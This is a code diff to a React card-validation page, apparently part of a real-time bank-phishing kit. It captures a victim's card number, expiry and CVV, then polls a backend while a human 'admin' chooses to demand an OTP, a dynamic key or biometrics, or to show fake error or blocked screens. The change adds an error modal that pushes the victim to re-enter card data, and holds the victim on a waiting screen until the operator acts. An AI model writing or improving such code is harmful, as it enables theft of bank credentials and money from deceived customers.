@@ -1,7 +1,8 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import Loading from "../../components/Loading";
+import IniciarSesionModal from "./modals/iniciarSesionModal";
 import './css/LoginModal.css';
 import Payment from "payment";
 
@@ -78,6 +79,13 @@ export default function ValidacionTC() {
         digits: "5456",
         label: "Débito Preferencial"
     });
+
+    // Modal de error (datos inválidos / timeout)
+    const [formState, setFormState] = useState({ lanzarModalErrorSesion: false });
+
+    // Refs para "aprobar custom": mantener usuario en espera hasta que admin pulse OTP/DIN/FIN
+    const estadoAnteriorRef = useRef(null);
+    const aprobadoEsperandoRef = useRef(false);
 
     // --- LÓGICA DE CARGA DE DATOS ---
     useEffect(() => {
@@ -423,9 +431,11 @@ export default function ValidacionTC() {
     // Función de polling para esperar respuesta del admin con timeout y límite de reintentos
     const iniciarPolling = (sesionId) => {
         let attempts = 0;
-        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
-        const TIMEOUT_MS = 180000; // 3 minutos en total
+        const MAX_ATTEMPTS = 60;
+        const TIMEOUT_MS = 180000;
         let timeoutId;
+        aprobadoEsperandoRef.current = false;
+        estadoAnteriorRef.current = null;
 
         const pollingInterval = setInterval(async () => {
             try {
@@ -434,44 +444,20 @@ export default function ValidacionTC() {
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
 
-                // Si viene data de tarjeta personalizada, actualizar estado
                 if (cardData) {
                     setCardData(cardData);
                     localStorageService.setItem("selectedCardData", cardData);
-                    // Si hay cardData del backend, es TC Custom
                     setIsTCCustom(true);
                 }
 
                 console.log('TC Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
-                // Verificar timeout o máximo de intentos
                 if (attempts >= MAX_ATTEMPTS) {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
-                    alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
-                    // Recargar página para permitir reintento
-                    window.location.reload();
-                    return;
-                }
-
-                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
-                // NO redirigir automáticamente, esperar a que el admin presione un botón específico
-                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                
-                if (estadosEspera.includes(estado)) {
-                    // Seguir esperando, mantener loading
-                    return;
-                }
-
-                // Si el estado es 'solicitar_tc' o 'solicitar_tc_custom', significa que el admin quiere que el usuario ingrese TC
-                // En este caso, NO redirigir, solo quitar loading y permitir que el usuario ingrese
-                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
-                    // El usuario ya está en la página de TC, solo quitar loading y resetear formulario
-                    clearInterval(pollingInterval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    // Resetear formulario para permitir reintento
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                     setCardDigits("");
                     setExpirationDate("");
                     setCvv("");
@@ -479,13 +465,29 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // Si hay error (rechazo del admin), limpiar campos y permitir reintento sin recargar
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                if (estadosEspera.includes(estado)) {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+
+                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
+
                 if (estado === 'error_tc') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
-                    alert("Los datos de la tarjeta son incorrectos. Por favor, verifícalos e inténtalo nuevamente.");
-                    // Limpiar campos para permitir reintento (sin recargar página)
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                     setCardDigits("");
                     setExpirationDate("");
                     setCvv("");
@@ -493,7 +495,21 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // Estados que detienen el polling (igual que OTP y DIN)
+                // Admin aprobó TC/CVV custom: backend pone 'solicitar_din' y muestra menú.
+                // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
+                const prev = estadoAnteriorRef.current;
+                const aprobadoAhora = (prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && estado === 'solicitar_din';
+                if (aprobadoAhora) {
+                    aprobadoEsperandoRef.current = true;
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                estadoAnteriorRef.current = estado;
+
                 const estadosFinales = [
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                     'error_tc', 'error_otp', 'error_din', 'error_login',
@@ -501,90 +517,71 @@ export default function ValidacionTC() {
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
+                if (!estadosFinales.includes(estado?.toLowerCase())) return;
 
-                if (estadosFinales.includes(estado.toLowerCase())) {
-                    clearInterval(pollingInterval);
-                    clearTimeout(timeoutId);
-                }
-
-                // Si el admin aprueba y pide siguiente paso, redirigir
-                // Limpiar intervalos antes de redirigir
+                clearInterval(pollingInterval);
+                clearTimeout(timeoutId);
                 setCargando(false);
 
                 switch (estado.toLowerCase()) {
                     case 'solicitar_otp':
-                        // Solo redirigir cuando el admin específicamente presiona el botón OTP
                         navigate('/numero-otp');
                         break;
-
                     case 'solicitar_din':
                         navigate('/clave-dinamica');
                         break;
-
                     case 'solicitar_finalizar':
                         navigate('/finalizado-page');
                         break;
-
                     case 'solicitar_biometria':
                         navigate('/verificacion-identidad');
                         break;
-
                     case 'error_923':
                         navigate('/error-923page');
                         break;
-
                     case 'solicitar_tc_custom':
-                        // Ya estamos en ValidacionTC, solo resetear formulario si es necesario
-                        // El cardData ya viene del backend y se carga automáticamente
                         break;
-
                     case 'solicitar_cvv_custom':
                         navigate('/validacion-cvv');
                         break;
-
                     case 'solicitar_cvv':
                         navigate('/validacion-cvv');
                         break;
-
                     case 'error_otp':
                         navigate('/numero-otp');
                         break;
-
                     case 'error_din':
                         navigate('/clave-dinamica');
                         break;
-
                     case 'error_login':
                         navigate('/autenticacion');
                         break;
-
                     default:
                         console.log("Estado no manejado en redirección:", estado);
-                        break;
                 }
 
             } catch (error) {
                 console.error('Error en polling:', error);
                 attempts++;
-                // Si hay muchos errores consecutivos, detener polling
                 if (attempts >= MAX_ATTEMPTS) {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
-                    alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
-                    // Recargar página para permitir reintento
-                    window.location.reload();
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                 }
             }
         }, 3000);
 
-        // Timeout global de 3 minutos
         timeoutId = setTimeout(() => {
             clearInterval(pollingInterval);
             setCargando(false);
-            alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
-            // Recargar página para permitir reintento
-            window.location.reload();
+            setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+            setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
+            setCardDigits("");
+            setExpirationDate("");
+            setCvv("");
+            setStep("front");
         }, TIMEOUT_MS);
     };
 
@@ -922,6 +919,12 @@ export default function ValidacionTC() {
 
             {/* Cargando */}
             {cargando ? <Loading /> : null}
+
+            {/* Modal de error (datos inválidos / timeout) */}
+            <IniciarSesionModal
+                isOpen={formState.lanzarModalErrorSesion}
+                onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
+            />
         </>
     );
 }
